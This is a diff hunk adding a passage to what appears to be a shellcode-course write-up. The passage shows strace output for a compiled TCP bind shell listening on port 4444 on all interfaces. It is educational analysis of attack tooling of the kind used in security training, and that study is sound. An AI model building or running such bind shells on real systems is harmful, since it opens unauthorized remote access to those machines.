@@ -721,6 +721,18 @@ osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh shell_bind_tcp
 [+] Linking ...
 [+] Done!
 ```
+
+Strace is used to debug and monitor the interactions between the executable process and the Linux kernel, visually showing the system calls for the TCP bind shell:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ strace -e socket,bind,listen,accept,dup2,execve ./shell_bind_tcp
+execve("./shell_bind_tcp", ["./shell_bind_tcp"], [/* 21 vars */]) = 0
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 22) = 0
+listen(3, 1)                            = 0
+accept(3, 
+```
+
 The binary is executed:
 
 ```bash
